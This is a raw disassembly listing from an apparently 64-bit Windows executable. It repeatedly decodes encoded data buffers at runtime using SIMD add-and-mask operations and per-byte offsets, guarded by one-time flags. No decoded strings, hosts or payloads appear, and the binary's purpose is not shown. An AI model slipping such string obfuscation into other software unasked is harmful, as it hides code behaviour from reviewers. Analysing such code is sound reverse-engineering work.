   140005368:	80 3d 40 8b 28 00 00 	cmpb   $0x0,0x288b40(%rip)        # 0x14028deaf
   14000536f:	0f 84 3b 23 00 00    	je     0x1400076b0
   140005375:	80 3d 76 92 28 00 00 	cmpb   $0x0,0x289276(%rip)        # 0x14028e5f2
   14000537c:	0f 84 e6 00 00 00    	je     0x140005468
   140005382:	66 0f 6f 05 36 55 00 	movdqa 0x5536(%rip),%xmm0        # 0x14000a8c0
   140005389:	00 
   14000538a:	66 0f 6f 15 de 91 28 	movdqa 0x2891de(%rip),%xmm2        # 0x14028e570
   140005391:	00 
   140005392:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005396:	66 0f 6f 0d 82 52 00 	movdqa 0x5282(%rip),%xmm1        # 0x14000a620
   14000539d:	00 
   14000539e:	66 0f db d1          	pand   %xmm1,%xmm2
   1400053a2:	66 0f 7f 15 c6 91 28 	movdqa %xmm2,0x2891c6(%rip)        # 0x14028e570
   1400053a9:	00 
   1400053aa:	66 0f 6f 15 ce 91 28 	movdqa 0x2891ce(%rip),%xmm2        # 0x14028e580
   1400053b1:	00 
   1400053b2:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400053b6:	66 0f db d1          	pand   %xmm1,%xmm2
   1400053ba:	66 0f 7f 15 be 91 28 	movdqa %xmm2,0x2891be(%rip)        # 0x14028e580
   1400053c1:	00 
   1400053c2:	66 0f 6f 15 c6 91 28 	movdqa 0x2891c6(%rip),%xmm2        # 0x14028e590
   1400053c9:	00 
   1400053ca:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400053ce:	66 0f db d1          	pand   %xmm1,%xmm2
   1400053d2:	66 0f 7f 15 b6 91 28 	movdqa %xmm2,0x2891b6(%rip)        # 0x14028e590
   1400053d9:	00 
   1400053da:	66 0f 6f 15 be 91 28 	movdqa 0x2891be(%rip),%xmm2        # 0x14028e5a0
   1400053e1:	00 
   1400053e2:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400053e6:	66 0f db d1          	pand   %xmm1,%xmm2
   1400053ea:	66 0f 7f 15 ae 91 28 	movdqa %xmm2,0x2891ae(%rip)        # 0x14028e5a0
   1400053f1:	00 
   1400053f2:	66 0f 6f 15 b6 91 28 	movdqa 0x2891b6(%rip),%xmm2        # 0x14028e5b0
   1400053f9:	00 
   1400053fa:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400053fe:	66 0f db d1          	pand   %xmm1,%xmm2
   140005402:	66 0f 7f 15 a6 91 28 	movdqa %xmm2,0x2891a6(%rip)        # 0x14028e5b0
   140005409:	00 
   14000540a:	66 0f 6f 15 ae 91 28 	movdqa 0x2891ae(%rip),%xmm2        # 0x14028e5c0
   140005411:	00 
   140005412:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005416:	66 0f db d1          	pand   %xmm1,%xmm2
   14000541a:	66 0f 7f 15 9e 91 28 	movdqa %xmm2,0x28919e(%rip)        # 0x14028e5c0
   140005421:	00 
   140005422:	66 0f 6f 15 a6 91 28 	movdqa 0x2891a6(%rip),%xmm2        # 0x14028e5d0
   140005429:	00 
   14000542a:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000542e:	66 0f db d1          	pand   %xmm1,%xmm2
   140005432:	66 0f 7f 15 96 91 28 	movdqa %xmm2,0x289196(%rip)        # 0x14028e5d0
   140005439:	00 
   14000543a:	66 0f fd 05 9e 91 28 	paddw  0x28919e(%rip),%xmm0        # 0x14028e5e0
   140005441:	00 
   140005442:	66 0f db c1          	pand   %xmm1,%xmm0
   140005446:	66 0f 7f 05 92 91 28 	movdqa %xmm0,0x289192(%rip)        # 0x14028e5e0
   14000544d:	00 
   14000544e:	8b 05 9c 91 28 00    	mov    0x28919c(%rip),%eax        # 0x14028e5f0
   140005454:	83 c0 19             	add    $0x19,%eax
   140005457:	0f b6 c0             	movzbl %al,%eax
   14000545a:	66 89 05 8f 91 28 00 	mov    %ax,0x28918f(%rip)        # 0x14028e5f0
   140005461:	c6 05 8a 91 28 00 00 	movb   $0x0,0x28918a(%rip)        # 0x14028e5f2
   140005468:	80 3d 41 8a 28 00 00 	cmpb   $0x0,0x288a41(%rip)        # 0x14028deb0
   14000546f:	0f 84 80 22 00 00    	je     0x1400076f5
   140005475:	80 3d a6 91 28 00 00 	cmpb   $0x0,0x2891a6(%rip)        # 0x14028e622
   14000547c:	74 56                	je     0x1400054d4
   14000547e:	66 0f 6f 05 3a 54 00 	movdqa 0x543a(%rip),%xmm0        # 0x14000a8c0
   140005485:	00 
   140005486:	66 0f 6f 0d 72 91 28 	movdqa 0x289172(%rip),%xmm1        # 0x14028e600
   14000548d:	00 
   14000548e:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140005492:	66 0f 6f 15 86 51 00 	movdqa 0x5186(%rip),%xmm2        # 0x14000a620
   140005499:	00 
   14000549a:	66 0f db ca          	pand   %xmm2,%xmm1
   14000549e:	66 0f 7f 0d 5a 91 28 	movdqa %xmm1,0x28915a(%rip)        # 0x14028e600
   1400054a5:	00 
   1400054a6:	66 0f fd 05 62 91 28 	paddw  0x289162(%rip),%xmm0        # 0x14028e610
   1400054ad:	00 
   1400054ae:	66 0f db c2          	pand   %xmm2,%xmm0
   1400054b2:	66 0f 7f 05 56 91 28 	movdqa %xmm0,0x289156(%rip)        # 0x14028e610
   1400054b9:	00 
   1400054ba:	8b 05 60 91 28 00    	mov    0x289160(%rip),%eax        # 0x14028e620
   1400054c0:	83 c0 19             	add    $0x19,%eax
   1400054c3:	0f b6 c0             	movzbl %al,%eax
   1400054c6:	66 89 05 53 91 28 00 	mov    %ax,0x289153(%rip)        # 0x14028e620
   1400054cd:	c6 05 4e 91 28 00 00 	movb   $0x0,0x28914e(%rip)        # 0x14028e622
   1400054d4:	48 8d 0d 95 90 28 00 	lea    0x289095(%rip),%rcx        # 0x14028e570
   1400054db:	48 8d 15 1e 91 28 00 	lea    0x28911e(%rip),%rdx        # 0x14028e600
   1400054e2:	e8 09 e4 ff ff       	call   0x1400038f0
   1400054e7:	80 3d c3 89 28 00 00 	cmpb   $0x0,0x2889c3(%rip)        # 0x14028deb1
   1400054ee:	0f 84 32 22 00 00    	je     0x140007726
   1400054f4:	80 3d af 91 28 00 00 	cmpb   $0x0,0x2891af(%rip)        # 0x14028e6aa
   1400054fb:	0f 84 1c 01 00 00    	je     0x14000561d
   140005501:	66 0f 6f 05 c7 53 00 	movdqa 0x53c7(%rip),%xmm0        # 0x14000a8d0
   140005508:	00 
   140005509:	66 0f 6f 15 1f 91 28 	movdqa 0x28911f(%rip),%xmm2        # 0x14028e630
   140005510:	00 
   140005511:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005515:	66 0f 6f 0d 03 51 00 	movdqa 0x5103(%rip),%xmm1        # 0x14000a620
   14000551c:	00 
   14000551d:	66 0f db d1          	pand   %xmm1,%xmm2
   140005521:	66 0f 7f 15 07 91 28 	movdqa %xmm2,0x289107(%rip)        # 0x14028e630
   140005528:	00 
   140005529:	66 0f 6f 15 0f 91 28 	movdqa 0x28910f(%rip),%xmm2        # 0x14028e640
   140005530:	00 
   140005531:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005535:	66 0f db d1          	pand   %xmm1,%xmm2
   140005539:	66 0f 7f 15 ff 90 28 	movdqa %xmm2,0x2890ff(%rip)        # 0x14028e640
   140005540:	00 
   140005541:	66 0f 6f 15 07 91 28 	movdqa 0x289107(%rip),%xmm2        # 0x14028e650
   140005548:	00 
   140005549:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000554d:	66 0f db d1          	pand   %xmm1,%xmm2
   140005551:	66 0f 7f 15 f7 90 28 	movdqa %xmm2,0x2890f7(%rip)        # 0x14028e650
   140005558:	00 
   140005559:	66 0f 6f 15 ff 90 28 	movdqa 0x2890ff(%rip),%xmm2        # 0x14028e660
   140005560:	00 
   140005561:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005565:	66 0f db d1          	pand   %xmm1,%xmm2
   140005569:	66 0f 7f 15 ef 90 28 	movdqa %xmm2,0x2890ef(%rip)        # 0x14028e660
   140005570:	00 
   140005571:	66 0f 6f 15 f7 90 28 	movdqa 0x2890f7(%rip),%xmm2        # 0x14028e670
   140005578:	00 
   140005579:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000557d:	66 0f db d1          	pand   %xmm1,%xmm2
   140005581:	66 0f 7f 15 e7 90 28 	movdqa %xmm2,0x2890e7(%rip)        # 0x14028e670
   140005588:	00 
   140005589:	66 0f 6f 15 ef 90 28 	movdqa 0x2890ef(%rip),%xmm2        # 0x14028e680
   140005590:	00 
   140005591:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005595:	66 0f db d1          	pand   %xmm1,%xmm2
   140005599:	66 0f 7f 15 df 90 28 	movdqa %xmm2,0x2890df(%rip)        # 0x14028e680
   1400055a0:	00 
   1400055a1:	66 0f fd 05 e7 90 28 	paddw  0x2890e7(%rip),%xmm0        # 0x14028e690
   1400055a8:	00 
   1400055a9:	66 0f db c1          	pand   %xmm1,%xmm0
   1400055ad:	66 0f 7f 05 db 90 28 	movdqa %xmm0,0x2890db(%rip)        # 0x14028e690
   1400055b4:	00 
   1400055b5:	8b 05 e5 90 28 00    	mov    0x2890e5(%rip),%eax        # 0x14028e6a0
   1400055bb:	83 c0 6f             	add    $0x6f,%eax
   1400055be:	0f b6 c0             	movzbl %al,%eax
   1400055c1:	66 89 05 d8 90 28 00 	mov    %ax,0x2890d8(%rip)        # 0x14028e6a0
   1400055c8:	0f b7 05 d3 90 28 00 	movzwl 0x2890d3(%rip),%eax        # 0x14028e6a2
   1400055cf:	83 c0 6f             	add    $0x6f,%eax
   1400055d2:	0f b6 c0             	movzbl %al,%eax
   1400055d5:	66 89 05 c6 90 28 00 	mov    %ax,0x2890c6(%rip)        # 0x14028e6a2
   1400055dc:	8b 05 c2 90 28 00    	mov    0x2890c2(%rip),%eax        # 0x14028e6a4
   1400055e2:	83 c0 6f             	add    $0x6f,%eax
   1400055e5:	0f b6 c0             	movzbl %al,%eax
   1400055e8:	66 89 05 b5 90 28 00 	mov    %ax,0x2890b5(%rip)        # 0x14028e6a4
   1400055ef:	0f b7 05 b0 90 28 00 	movzwl 0x2890b0(%rip),%eax        # 0x14028e6a6
   1400055f6:	83 c0 6f             	add    $0x6f,%eax
   1400055f9:	0f b6 c0             	movzbl %al,%eax
   1400055fc:	66 89 05 a3 90 28 00 	mov    %ax,0x2890a3(%rip)        # 0x14028e6a6
   140005603:	8b 05 9f 90 28 00    	mov    0x28909f(%rip),%eax        # 0x14028e6a8
   140005609:	83 c0 6f             	add    $0x6f,%eax
   14000560c:	0f b6 c0             	movzbl %al,%eax
   14000560f:	66 89 05 92 90 28 00 	mov    %ax,0x289092(%rip)        # 0x14028e6a8
   140005616:	c6 05 8d 90 28 00 00 	movb   $0x0,0x28908d(%rip)        # 0x14028e6aa
   14000561d:	80 3d 8e 88 28 00 00 	cmpb   $0x0,0x28888e(%rip)        # 0x14028deb2
   140005624:	0f 84 9a 21 00 00    	je     0x1400077c4
   14000562a:	80 3d 99 90 28 00 00 	cmpb   $0x0,0x289099(%rip)        # 0x14028e6ca
   140005631:	74 5a                	je     0x14000568d
   140005633:	66 0f 6f 05 75 90 28 	movdqa 0x289075(%rip),%xmm0        # 0x14028e6b0
   14000563a:	00 
   14000563b:	66 0f fd 05 8d 52 00 	paddw  0x528d(%rip),%xmm0        # 0x14000a8d0
   140005642:	00 
   140005643:	66 0f db 05 d5 4f 00 	pand   0x4fd5(%rip),%xmm0        # 0x14000a620
   14000564a:	00 
   14000564b:	66 0f 7f 05 5d 90 28 	movdqa %xmm0,0x28905d(%rip)        # 0x14028e6b0
   140005652:	00 
   140005653:	f3 0f 7e 05 65 90 28 	movq   0x289065(%rip),%xmm0        # 0x14028e6c0
   14000565a:	00 
   14000565b:	66 0f fd 05 8d 52 00 	paddw  0x528d(%rip),%xmm0        # 0x14000a8f0
   140005662:	00 
   140005663:	66 0f db 05 f5 4f 00 	pand   0x4ff5(%rip),%xmm0        # 0x14000a660
   14000566a:	00 
   14000566b:	66 0f d6 05 4d 90 28 	movq   %xmm0,0x28904d(%rip)        # 0x14028e6c0
   140005672:	00 
   140005673:	8b 05 4f 90 28 00    	mov    0x28904f(%rip),%eax        # 0x14028e6c8
   140005679:	83 c0 6f             	add    $0x6f,%eax
   14000567c:	0f b6 c0             	movzbl %al,%eax
   14000567f:	66 89 05 42 90 28 00 	mov    %ax,0x289042(%rip)        # 0x14028e6c8
   140005686:	c6 05 3d 90 28 00 00 	movb   $0x0,0x28903d(%rip)        # 0x14028e6ca
   14000568d:	48 8d 0d 9c 8f 28 00 	lea    0x288f9c(%rip),%rcx        # 0x14028e630
   140005694:	48 8d 15 15 90 28 00 	lea    0x289015(%rip),%rdx        # 0x14028e6b0
   14000569b:	e8 50 e2 ff ff       	call   0x1400038f0
   1400056a0:	80 3d 0c 88 28 00 00 	cmpb   $0x0,0x28880c(%rip)        # 0x14028deb3
   1400056a7:	0f 84 6d 21 00 00    	je     0x14000781a
   1400056ad:	80 3d 8e 90 28 00 00 	cmpb   $0x0,0x28908e(%rip)        # 0x14028e742
   1400056b4:	0f 84 ce 00 00 00    	je     0x140005788
   1400056ba:	66 0f 6f 05 3e 52 00 	movdqa 0x523e(%rip),%xmm0        # 0x14000a900
   1400056c1:	00 
   1400056c2:	66 0f 6f 15 06 90 28 	movdqa 0x289006(%rip),%xmm2        # 0x14028e6d0
   1400056c9:	00 
   1400056ca:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400056ce:	66 0f 6f 0d 4a 4f 00 	movdqa 0x4f4a(%rip),%xmm1        # 0x14000a620
   1400056d5:	00 
   1400056d6:	66 0f db d1          	pand   %xmm1,%xmm2
   1400056da:	66 0f 7f 15 ee 8f 28 	movdqa %xmm2,0x288fee(%rip)        # 0x14028e6d0
   1400056e1:	00 
   1400056e2:	66 0f 6f 15 f6 8f 28 	movdqa 0x288ff6(%rip),%xmm2        # 0x14028e6e0
   1400056e9:	00 
   1400056ea:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400056ee:	66 0f db d1          	pand   %xmm1,%xmm2
   1400056f2:	66 0f 7f 15 e6 8f 28 	movdqa %xmm2,0x288fe6(%rip)        # 0x14028e6e0
   1400056f9:	00 
   1400056fa:	66 0f 6f 15 ee 8f 28 	movdqa 0x288fee(%rip),%xmm2        # 0x14028e6f0
   140005701:	00 
   140005702:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005706:	66 0f db d1          	pand   %xmm1,%xmm2
   14000570a:	66 0f 7f 15 de 8f 28 	movdqa %xmm2,0x288fde(%rip)        # 0x14028e6f0
   140005711:	00 
   140005712:	66 0f 6f 15 e6 8f 28 	movdqa 0x288fe6(%rip),%xmm2        # 0x14028e700
   140005719:	00 
   14000571a:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000571e:	66 0f db d1          	pand   %xmm1,%xmm2
   140005722:	66 0f 7f 15 d6 8f 28 	movdqa %xmm2,0x288fd6(%rip)        # 0x14028e700
   140005729:	00 
   14000572a:	66 0f 6f 15 de 8f 28 	movdqa 0x288fde(%rip),%xmm2        # 0x14028e710
   140005731:	00 
   140005732:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005736:	66 0f db d1          	pand   %xmm1,%xmm2
   14000573a:	66 0f 7f 15 ce 8f 28 	movdqa %xmm2,0x288fce(%rip)        # 0x14028e710
   140005741:	00 
   140005742:	66 0f 6f 15 d6 8f 28 	movdqa 0x288fd6(%rip),%xmm2        # 0x14028e720
   140005749:	00 
   14000574a:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000574e:	66 0f db d1          	pand   %xmm1,%xmm2
   140005752:	66 0f 7f 15 c6 8f 28 	movdqa %xmm2,0x288fc6(%rip)        # 0x14028e720
   140005759:	00 
   14000575a:	66 0f fd 05 ce 8f 28 	paddw  0x288fce(%rip),%xmm0        # 0x14028e730
   140005761:	00 
   140005762:	66 0f db c1          	pand   %xmm1,%xmm0
   140005766:	66 0f 7f 05 c2 8f 28 	movdqa %xmm0,0x288fc2(%rip)        # 0x14028e730
   14000576d:	00 
   14000576e:	8b 05 cc 8f 28 00    	mov    0x288fcc(%rip),%eax        # 0x14028e740
   140005774:	83 c0 63             	add    $0x63,%eax
   140005777:	0f b6 c0             	movzbl %al,%eax
   14000577a:	66 89 05 bf 8f 28 00 	mov    %ax,0x288fbf(%rip)        # 0x14028e740
   140005781:	c6 05 ba 8f 28 00 00 	movb   $0x0,0x288fba(%rip)        # 0x14028e742
   140005788:	80 3d 25 87 28 00 00 	cmpb   $0x0,0x288725(%rip)        # 0x14028deb4
   14000578f:	0f 84 1e 21 00 00    	je     0x1400078b3
   140005795:	80 3d c6 8f 28 00 00 	cmpb   $0x0,0x288fc6(%rip)        # 0x14028e762
   14000579c:	74 3a                	je     0x1400057d8
   14000579e:	66 0f 6f 05 aa 8f 28 	movdqa 0x288faa(%rip),%xmm0        # 0x14028e750
   1400057a5:	00 
   1400057a6:	66 0f fd 05 52 51 00 	paddw  0x5152(%rip),%xmm0        # 0x14000a900
   1400057ad:	00 
   1400057ae:	66 0f db 05 6a 4e 00 	pand   0x4e6a(%rip),%xmm0        # 0x14000a620
   1400057b5:	00 
   1400057b6:	66 0f 7f 05 92 8f 28 	movdqa %xmm0,0x288f92(%rip)        # 0x14028e750
   1400057bd:	00 
   1400057be:	8b 05 9c 8f 28 00    	mov    0x288f9c(%rip),%eax        # 0x14028e760
   1400057c4:	83 c0 63             	add    $0x63,%eax
   1400057c7:	0f b6 c0             	movzbl %al,%eax
   1400057ca:	66 89 05 8f 8f 28 00 	mov    %ax,0x288f8f(%rip)        # 0x14028e760
   1400057d1:	c6 05 8a 8f 28 00 00 	movb   $0x0,0x288f8a(%rip)        # 0x14028e762
   1400057d8:	48 8d 0d f1 8e 28 00 	lea    0x288ef1(%rip),%rcx        # 0x14028e6d0
   1400057df:	48 8d 15 6a 8f 28 00 	lea    0x288f6a(%rip),%rdx        # 0x14028e750
   1400057e6:	e8 05 e1 ff ff       	call   0x1400038f0
   1400057eb:	80 3d c3 86 28 00 00 	cmpb   $0x0,0x2886c3(%rip)        # 0x14028deb5
   1400057f2:	0f 84 00 21 00 00    	je     0x1400078f8
   1400057f8:	80 3d e5 8f 28 00 00 	cmpb   $0x0,0x288fe5(%rip)        # 0x14028e7e4
   1400057ff:	0f 84 e2 00 00 00    	je     0x1400058e7
   140005805:	66 0f 6f 05 13 51 00 	movdqa 0x5113(%rip),%xmm0        # 0x14000a920
   14000580c:	00 
   14000580d:	66 0f 6f 15 5b 8f 28 	movdqa 0x288f5b(%rip),%xmm2        # 0x14028e770
   140005814:	00 
   140005815:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005819:	66 0f 6f 0d ff 4d 00 	movdqa 0x4dff(%rip),%xmm1        # 0x14000a620
   140005820:	00 
   140005821:	66 0f db d1          	pand   %xmm1,%xmm2
   140005825:	66 0f 7f 15 43 8f 28 	movdqa %xmm2,0x288f43(%rip)        # 0x14028e770
   14000582c:	00 
   14000582d:	66 0f 6f 15 4b 8f 28 	movdqa 0x288f4b(%rip),%xmm2        # 0x14028e780
   140005834:	00 
   140005835:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005839:	66 0f db d1          	pand   %xmm1,%xmm2
   14000583d:	66 0f 7f 15 3b 8f 28 	movdqa %xmm2,0x288f3b(%rip)        # 0x14028e780
   140005844:	00 
   140005845:	66 0f 6f 15 43 8f 28 	movdqa 0x288f43(%rip),%xmm2        # 0x14028e790
   14000584c:	00 
   14000584d:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005851:	66 0f db d1          	pand   %xmm1,%xmm2
   140005855:	66 0f 7f 15 33 8f 28 	movdqa %xmm2,0x288f33(%rip)        # 0x14028e790
   14000585c:	00 
   14000585d:	66 0f 6f 15 3b 8f 28 	movdqa 0x288f3b(%rip),%xmm2        # 0x14028e7a0
   140005864:	00 
   140005865:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005869:	66 0f db d1          	pand   %xmm1,%xmm2
   14000586d:	66 0f 7f 15 2b 8f 28 	movdqa %xmm2,0x288f2b(%rip)        # 0x14028e7a0
   140005874:	00 
   140005875:	66 0f 6f 15 33 8f 28 	movdqa 0x288f33(%rip),%xmm2        # 0x14028e7b0
   14000587c:	00 
   14000587d:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005881:	66 0f db d1          	pand   %xmm1,%xmm2
   140005885:	66 0f 7f 15 23 8f 28 	movdqa %xmm2,0x288f23(%rip)        # 0x14028e7b0
   14000588c:	00 
   14000588d:	66 0f 6f 15 2b 8f 28 	movdqa 0x288f2b(%rip),%xmm2        # 0x14028e7c0
   140005894:	00 
   140005895:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005899:	66 0f db d1          	pand   %xmm1,%xmm2
   14000589d:	66 0f 7f 15 1b 8f 28 	movdqa %xmm2,0x288f1b(%rip)        # 0x14028e7c0
   1400058a4:	00 
   1400058a5:	66 0f fd 05 23 8f 28 	paddw  0x288f23(%rip),%xmm0        # 0x14028e7d0
   1400058ac:	00 
   1400058ad:	66 0f db c1          	pand   %xmm1,%xmm0
   1400058b1:	66 0f 7f 05 17 8f 28 	movdqa %xmm0,0x288f17(%rip)        # 0x14028e7d0
   1400058b8:	00 
   1400058b9:	8b 05 21 8f 28 00    	mov    0x288f21(%rip),%eax        # 0x14028e7e0
   1400058bf:	83 c0 3b             	add    $0x3b,%eax
   1400058c2:	0f b6 c0             	movzbl %al,%eax
   1400058c5:	66 89 05 14 8f 28 00 	mov    %ax,0x288f14(%rip)        # 0x14028e7e0
   1400058cc:	0f b7 05 0f 8f 28 00 	movzwl 0x288f0f(%rip),%eax        # 0x14028e7e2
   1400058d3:	83 c0 3b             	add    $0x3b,%eax
   1400058d6:	0f b6 c0             	movzbl %al,%eax
   1400058d9:	66 89 05 02 8f 28 00 	mov    %ax,0x288f02(%rip)        # 0x14028e7e2
   1400058e0:	c6 05 fd 8e 28 00 00 	movb   $0x0,0x288efd(%rip)        # 0x14028e7e4
   1400058e7:	80 3d c8 85 28 00 00 	cmpb   $0x0,0x2885c8(%rip)        # 0x14028deb6
   1400058ee:	0f 84 9e 20 00 00    	je     0x140007992
   1400058f4:	80 3d 09 8f 28 00 00 	cmpb   $0x0,0x288f09(%rip)        # 0x14028e804
   1400058fb:	74 47                	je     0x140005944
   1400058fd:	66 0f 6f 05 eb 8e 28 	movdqa 0x288eeb(%rip),%xmm0        # 0x14028e7f0
   140005904:	00 
   140005905:	66 0f fd 05 13 50 00 	paddw  0x5013(%rip),%xmm0        # 0x14000a920
   14000590c:	00 
   14000590d:	66 0f db 05 0b 4d 00 	pand   0x4d0b(%rip),%xmm0        # 0x14000a620
   140005914:	00 
   140005915:	66 0f 7f 05 d3 8e 28 	movdqa %xmm0,0x288ed3(%rip)        # 0x14028e7f0
   14000591c:	00 
   14000591d:	66 0f 6f 05 db 8e 28 	movdqa 0x288edb(%rip),%xmm0        # 0x14028e800
   140005924:	00 
   140005925:	66 0f fd 05 13 50 00 	paddw  0x5013(%rip),%xmm0        # 0x14000a940
   14000592c:	00 
   14000592d:	66 0f db 05 5b 4d 00 	pand   0x4d5b(%rip),%xmm0        # 0x14000a690
   140005934:	00 
   140005935:	66 0f 7e 05 c3 8e 28 	movd   %xmm0,0x288ec3(%rip)        # 0x14028e800
   14000593c:	00 
   14000593d:	c6 05 c0 8e 28 00 00 	movb   $0x0,0x288ec0(%rip)        # 0x14028e804
   140005944:	48 8d 0d 25 8e 28 00 	lea    0x288e25(%rip),%rcx        # 0x14028e770
   14000594b:	48 8d 15 9e 8e 28 00 	lea    0x288e9e(%rip),%rdx        # 0x14028e7f0
   140005952:	e8 99 df ff ff       	call   0x1400038f0
   140005957:	48 8d 8d 40 0e 00 00 	lea    0xe40(%rbp),%rcx
   14000595e:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140005964:	31 d2                	xor    %edx,%edx
   140005966:	e8 65 44 00 00       	call   0x140009dd0
   14000596b:	80 3d 45 85 28 00 00 	cmpb   $0x0,0x288545(%rip)        # 0x14028deb7
   140005972:	0f 84 60 20 00 00    	je     0x1400079d8
   140005978:	80 3d ad 8e 28 00 00 	cmpb   $0x0,0x288ead(%rip)        # 0x14028e82c
   14000597f:	74 67                	je     0x1400059e8
   140005981:	66 0f 6f 05 87 8e 28 	movdqa 0x288e87(%rip),%xmm0        # 0x14028e810
   140005988:	00 
   140005989:	66 0f fd 05 cf 4f 00 	paddw  0x4fcf(%rip),%xmm0        # 0x14000a960
   140005990:	00 
   140005991:	66 0f db 05 87 4c 00 	pand   0x4c87(%rip),%xmm0        # 0x14000a620
   140005998:	00 
   140005999:	66 0f 7f 05 6f 8e 28 	movdqa %xmm0,0x288e6f(%rip)        # 0x14028e810
   1400059a0:	00 
   1400059a1:	f3 0f 7e 05 77 8e 28 	movq   0x288e77(%rip),%xmm0        # 0x14028e820
   1400059a8:	00 
   1400059a9:	66 0f fd 05 bf 4f 00 	paddw  0x4fbf(%rip),%xmm0        # 0x14000a970
   1400059b0:	00 
   1400059b1:	66 0f db 05 a7 4c 00 	pand   0x4ca7(%rip),%xmm0        # 0x14000a660
   1400059b8:	00 
   1400059b9:	66 0f d6 05 5f 8e 28 	movq   %xmm0,0x288e5f(%rip)        # 0x14028e820
   1400059c0:	00 
   1400059c1:	f3 0f 7e 05 5f 8e 28 	movq   0x288e5f(%rip),%xmm0        # 0x14028e828
   1400059c8:	00 
   1400059c9:	66 0f fd 05 af 4f 00 	paddw  0x4faf(%rip),%xmm0        # 0x14000a980
   1400059d0:	00 
   1400059d1:	66 0f db 05 b7 4c 00 	pand   0x4cb7(%rip),%xmm0        # 0x14000a690
   1400059d8:	00 
   1400059d9:	66 0f 7e 05 47 8e 28 	movd   %xmm0,0x288e47(%rip)        # 0x14028e828
   1400059e0:	00 
   1400059e1:	c6 05 44 8e 28 00 00 	movb   $0x0,0x288e44(%rip)        # 0x14028e82c
   1400059e8:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   1400059ef:	4c 89 f9             	mov    %r15,%rcx
   1400059f2:	e8 e9 42 00 00       	call   0x140009ce0
   1400059f7:	48 8d 15 12 8e 28 00 	lea    0x288e12(%rip),%rdx        # 0x14028e810
   1400059fe:	4c 89 f9             	mov    %r15,%rcx
   140005a01:	e8 ca 42 00 00       	call   0x140009cd0
   140005a06:	80 3d ab 84 28 00 00 	cmpb   $0x0,0x2884ab(%rip)        # 0x14028deb8
   140005a0d:	0f 84 1c 20 00 00    	je     0x140007a2f
   140005a13:	80 3d 52 8e 28 00 00 	cmpb   $0x0,0x288e52(%rip)        # 0x14028e86c
   140005a1a:	0f 84 de 00 00 00    	je     0x140005afe
   140005a20:	f3 0f 7e 15 08 8e 28 	movq   0x288e08(%rip),%xmm2        # 0x14028e830
   140005a27:	00 
   140005a28:	66 0f 6f 05 60 4f 00 	movdqa 0x4f60(%rip),%xmm0        # 0x14000a990
   140005a2f:	00 
   140005a30:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005a34:	66 0f 6f 0d 24 4c 00 	movdqa 0x4c24(%rip),%xmm1        # 0x14000a660
   140005a3b:	00 
   140005a3c:	66 0f db d1          	pand   %xmm1,%xmm2
   140005a40:	f3 0f 7e 1d f0 8d 28 	movq   0x288df0(%rip),%xmm3        # 0x14028e838
   140005a47:	00 
   140005a48:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005a4c:	66 0f db d9          	pand   %xmm1,%xmm3
   140005a50:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005a54:	f3 0f 7f 15 d4 8d 28 	movdqu %xmm2,0x288dd4(%rip)        # 0x14028e830
   140005a5b:	00 
   140005a5c:	f3 0f 7e 15 dc 8d 28 	movq   0x288ddc(%rip),%xmm2        # 0x14028e840
   140005a63:	00 
   140005a64:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005a68:	66 0f db d1          	pand   %xmm1,%xmm2
   140005a6c:	f3 0f 7e 1d d4 8d 28 	movq   0x288dd4(%rip),%xmm3        # 0x14028e848
   140005a73:	00 
   140005a74:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005a78:	66 0f db d9          	pand   %xmm1,%xmm3
   140005a7c:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005a80:	f3 0f 7f 15 b8 8d 28 	movdqu %xmm2,0x288db8(%rip)        # 0x14028e840
   140005a87:	00 
   140005a88:	f3 0f 7e 15 c0 8d 28 	movq   0x288dc0(%rip),%xmm2        # 0x14028e850
   140005a8f:	00 
   140005a90:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005a94:	66 0f db d1          	pand   %xmm1,%xmm2
   140005a98:	f3 0f 7e 1d b8 8d 28 	movq   0x288db8(%rip),%xmm3        # 0x14028e858
   140005a9f:	00 
   140005aa0:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005aa4:	66 0f db d9          	pand   %xmm1,%xmm3
   140005aa8:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005aac:	f3 0f 7f 15 9c 8d 28 	movdqu %xmm2,0x288d9c(%rip)        # 0x14028e850
   140005ab3:	00 
   140005ab4:	f3 0f 7e 15 a4 8d 28 	movq   0x288da4(%rip),%xmm2        # 0x14028e860
   140005abb:	00 
   140005abc:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005ac0:	66 0f db d1          	pand   %xmm1,%xmm2
   140005ac4:	66 0f d6 15 94 8d 28 	movq   %xmm2,0x288d94(%rip)        # 0x14028e860
   140005acb:	00 
   140005acc:	b8 d5 00 00 00       	mov    $0xd5,%eax
